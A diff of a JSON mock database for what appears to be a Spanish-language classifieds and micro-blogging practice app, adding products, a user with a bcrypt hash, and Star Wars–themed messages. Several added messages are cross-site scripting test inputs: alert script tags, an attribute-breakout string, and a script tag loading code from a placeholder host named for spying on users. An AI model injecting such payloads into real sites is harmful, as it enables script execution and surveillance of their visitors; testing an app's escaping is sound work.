@@ -3,24 +3,26 @@
     {
       "name": "Mobile phone",
       "description": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla porta malesuada ex, rutrum mattis velit hendrerit sed.",
-      "isType": "busca",
+      "isType": "Busca",
       "price": 350.15,
       "image": "mobile.jpg",
       "createdAt": "2021-02-01T19:25:36.038Z",
       "id": 1
     },
     {
-      "name": "Motorbike",
-      "isType": "vende",
-      "description": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla porta malesuada ex, rutrum mattis velit hendrerit sed.",
-      "price": 1500,
+      "id": 2,
+      "name": "Moto",
+      "description": "      ",
+      "isType": "Vende",
+      "price": "1499",
       "image": "motorbike.jpg",
-      "createdAt": "2021-02-02T19:25:41.153Z",
-      "id": 2
+      "date": "2021-02-02T19:25:41.153Z",
+      "userId": 1,
+      "updatedAt": "2021-03-03T11:56:15.375Z"
     },
     {
       "name": "Agenda",
-      "isType": "busca",
+      "isType": "Busca",
       "description": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla porta malesuada ex, rutrum mattis velit hendrerit sed.",
       "price": 8,
       "image": "agenda.jpg",
@@ -29,7 +31,7 @@
     },
     {
       "name": "Mesa",
-      "isType": "vende",
+      "isType": "Vende",
       "description": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla porta malesuada ex, rutrum mattis velit hendrerit sed.",
       "price": 180,
       "image": "desk.jpg",
@@ -37,17 +39,19 @@
       "id": 4
     },
     {
-      "name": "Televisión",
-      "isType": "busca",
-      "description": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla porta malesuada ex, rutrum mattis velit hendrerit sed.",
-      "price": 280,
+      "id": 5,
+      "name": "TV",
+      "description": "      ",
+      "isType": "Vende",
+      "price": "120",
       "image": "tv.jpg",
-      "createdAt": "2021-02-05T19:25:41.153Z",
-      "id": 5
+      "date": "2021-02-04T19:25:41.153Z",
+      "userId": 1,
+      "updatedAt": "2021-03-03T11:52:30.077Z"
     },
     {
       "name": "Bicicleta",
-      "isType": "vende",
+      "isType": "Vende",
       "description": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla porta malesuada ex, rutrum mattis velit hendrerit sed.",
       "price": 70,
       "image": "bicycle.jpg",
@@ -56,7 +60,7 @@
     },
     {
       "name": "Tabla de padel surf",
-      "isType": "vende",
+      "isType": "Vende",
       "description": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla porta malesuada ex, rutrum mattis velit hendrerit sed.",
       "price": 60,
       "image": "padel.jpg",
@@ -66,7 +70,7 @@
     {
       "name": "Raspberry Pi 2 Model B",
       "description": "Cacharrito para juguetear                  ",
-      "isType": "busca",
+      "isType": "Busca",
       "price": "60",
       "image": "http://127.0.0.1:8000//file-1614536259825.png",
       "userId": 16,
@@ -76,7 +80,7 @@
     {
       "name": "Garmin TRX / VivoActive",
       "description": "Pulsómetro de muñeca                  ",
-      "isType": "busca",
+      "isType": "Busca",
       "price": "260",
       "image": "http://127.0.0.1:8000//file-1614538398000.jpg",
       "userId": 16,
@@ -86,12 +90,42 @@
     {
       "name": "Cubo de Rubik",
       "description": "Cubo de Rubik                  ",
-      "isType": "vende",
+      "isType": "Vende",
       "price": "22",
       "image": "http://127.0.0.1:8000//file-1614539248995.jpg",
       "userId": 16,
       "updatedAt": "2021-02-28T19:07:29.143Z",
       "id": 10
+    },
+    {
+      "name": "Auriculares",
+      "description": "Auriculares BT...                  ",
+      "isType": "Vende",
+      "price": "90",
+      "image": "http://127.0.0.1:8000//file-1614592021490.jpg",
+      "userId": 1,
+      "updatedAt": "2021-03-01T09:47:01.508Z",
+      "id": 11
+    },
+    {
+      "name": "Mochila",
+      "description": "Mochila Nennn                  ",
+      "isType": "Vende",
+      "price": "70",
+      "image": "http://127.0.0.1:8000//file-1614597019523.jpg",
+      "userId": 20,
+      "updatedAt": "2021-03-01T11:10:19.539Z",
+      "id": 12
+    },
+    {
+      "name": "Runner shoes",
+      "description": "                  ",
+      "isType": "Busca",
+      "price": "120",
+      "image": "http://127.0.0.1:8000//file-1614600904211.jpg",
+      "userId": 21,
+      "updatedAt": "2021-03-01T12:15:04.225Z",
+      "id": 13
     }
   ],
   "users": [
@@ -194,7 +228,222 @@
       "username": "mortysmith@aventura.es",
       "password": "$2b$10$ugy4Uz7yZOZm/MYGHrc9K.3K.UB4SvRSerga4DIZHBEz0eovgXprW",
       "id": 20
+    },
+    {
+      "username": "ricksanchez@wc.molon",
+      "password": "$2b$10$soZQB2PYj8W0rkCoVY0YH.2cqOHd8patv6OQr0vZH3CP2mGtkh4bW",
+      "id": 21
     }
   ],
-  "movies": []
+  "movies": [],
+  "messages": [
+    {
+      "message": "No One's Ever Really Gone",
+      "userId": 1,
+      "createdAt": "2021-02-01T19:25:36.038Z",
+      "id": 1
+    },
+    {
+      "message": "I am your father",
+      "userId": 2,
+      "createdAt": "2021-02-02T19:25:41.153Z",
+      "id": 2
+    },
+    {
+      "message": "Help me, Obi-Wan Kenobi. You’re my only hope.",
+      "userId": 3,
+      "createdAt": "2021-02-03T19:25:41.153Z",
+      "id": 3
+    },
+    {
+      "message": "WWWWWWWGGGGHHHRRRRW AAARARRRGWWWH",
+      "userId": 4,
+      "createdAt": "2021-02-04T19:25:41.153Z",
+      "id": 4
+    },
+    {
+      "message": "It's the ship that made the Kessel Run in less than twelve parsecs!",
+      "userId": 5,
+      "createdAt": "2021-02-05T19:25:41.153Z",
+      "id": 5
+    },
+    {
+      "message": "It's not wise to upset a Wookie",
+      "userId": 6,
+      "createdAt": "2021-02-06T19:25:41.153Z",
+      "id": 6
+    },
+    {
+      "message": "Fear is the path to the dark side. Fear leads to anger. Anger leads to hate. Hate leads to suffering.",
+      "userId": 7,
+      "createdAt": "2021-02-07T19:25:41.153Z",
+      "id": 7
+    },
+    {
+      "message": "Unlimited Power!",
+      "userId": 8,
+      "createdAt": "2021-02-08T19:25:41.153Z",
+      "id": 8
+    },
+    {
+      "message": "Strike Me Down In Anger And I'll Always Be With You.",
+      "userId": 1,
+      "createdAt": "2021-02-09T19:25:41.153Z",
+      "id": 9
+    },
+    {
+      "message": "Noooooooooooooooooooooooooooooo",
+      "userId": 2,
+      "createdAt": "2021-02-10T19:25:41.153Z",
+      "id": 10
+    },
+    {
+      "message": "Help me, Obi-Wan Kenobi. You’re my only hope.",
+      "userId": 3,
+      "createdAt": "2021-02-11T19:25:41.153Z",
+      "id": 11
+    },
+    {
+      "message": "WAGRRRRWWGAHHHHWWWRRGGAWWWWWWRR",
+      "userId": 4,
+      "createdAt": "2021-02-12T19:25:41.153Z",
+      "id": 12
+    },
+    {
+      "message": "I know",
+      "userId": 5,
+      "createdAt": "2021-02-13T19:25:41.153Z",
+      "id": 13
+    },
+    {
+      "message": "I Suggest A New Strategy, R2 - Let The Wookiee Win.",
+      "userId": 6,
+      "createdAt": "2021-02-14T19:25:41.153Z",
+      "id": 14
+    },
+    {
+      "message": "Do or do not. There is no try.",
+      "userId": 7,
+      "createdAt": "2021-02-15T19:25:41.153Z",
+      "id": 15
+    },
+    {
+      "message": "Execute Order Sixty-Six!",
+      "userId": 8,
+      "createdAt": "2021-02-16T19:25:41.153Z",
+      "id": 16
+    },
+    {
+      "message": "Lorem ipsum dolor sit amet",
+      "userId": 9,
+      "updatedAt": "2021-02-16T22:50:22.374Z",
+      "id": 17
+    },
+    {
+      "message": "Holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa este es mi nuevo tweet",
+      "userId": 9,
+      "updatedAt": "2021-02-16T22:55:19.502Z",
+      "id": 18
+    },
+    {
+      "message": "Nuevo tweet siendo kas",
+      "userId": 10,
+      "updatedAt": "2021-02-16T23:06:17.216Z",
+      "id": 19
+    },
+    {
+      "message": "Hola <span style=\"color:pink\">mundo</span>",
+      "userId": 10,
+      "updatedAt": "2021-02-16T23:11:24.563Z",
+      "id": 20
+    },
+    {
+      "message": "Este tweet es inofensivo <script>alert('que pasa madafakas');</script>",
+      "userId": 10,
+      "updatedAt": "2021-02-16T23:11:59.572Z",
+      "id": 21
+    },
+    {
+      "message": "Hola amigos\n\n<script src=\"https://codigo.js/para/espiar/usuarios/de/tu/web\"></script>",
+      "userId": 10,
+      "updatedAt": "2021-02-16T23:13:14.365Z",
+      "id": 22
+    },
+    {
+      "message": "'><script>añert(\"Holaaaaaa\")</script>'",
+      "userId": 10,
+      "updatedAt": "2021-02-16T23:15:50.548Z",
+      "id": 23
+    },
+    {
+      "message": "'><script>alert(\"HOLA\");</script>'.",
+      "userId": 10,
+      "updatedAt": "2021-02-16T23:16:10.272Z",
+      "id": 24
+    },
+    {
+      "message": "asdasjdnasjkn <strong>asdasdas</strong>",
+      "userId": 10,
+      "updatedAt": "2021-02-16T23:16:26.101Z",
+      "id": 25
+    },
+    {
+      "message": "Hola <img src=\"https://external-preview.redd.it/RhTABATlWxdc482qm0ElC7MX6h98XWeQUAVpqO8C68E.jpg?auto=webp&s=2a1c1ea41e53d35580546e4108a040a2b647a62c\" width=\"100\">",
+      "userId": 10,
+      "updatedAt": "2021-02-16T23:17:13.850Z",
+      "id": 26
+    },
+    {
+      "message": "aedasdasdas",
+      "userId": 10,
+      "updatedAt": "2021-02-16T23:22:32.135Z",
+      "id": 27
+    },
+    {
+      "message": "heloooooo",
+      "userId": 12,
+      "updatedAt": "2021-02-17T14:57:14.419Z",
+      "id": 28
+    },
+    {
+      "message": "yeahhhhhhhhhhhhhhhhhhhhhhhhhh",
+      "userId": 13,
+      "updatedAt": "2021-02-17T15:05:00.416Z",
+      "id": 29
+    },
+    {
+      "message": "Holaaaa",
+      "userId": 1,
+      "updatedAt": "2021-02-18T19:54:33.272Z",
+      "id": 30
+    },
+    {
+      "message": "aekdnaekldjnealjkdnea",
+      "images": null,
+      "image": {},
+      "userId": 1,
+      "updatedAt": "2021-02-18T20:04:29.613Z",
+      "id": 31
+    },
+    {
+      "message": "este va con imagen",
+      "images": null,
+      "image": {},
+      "userId": 1,
+      "updatedAt": "2021-02-18T20:04:56.989Z",
+      "id": 32
+    },
+    {
+      "message": "Primera prueba con imagen",
+      "userId": 1,
+      "updatedAt": "2021-02-18T20:19:22.443Z",
+      "id": 33
+    },
+    {
+      "message": "Mandoooooooooooo",
+      "userId": 1,
+      "updatedAt": "2021-02-18T20:22:56.533Z",
+      "id": 34
+    }
+  ]
 }
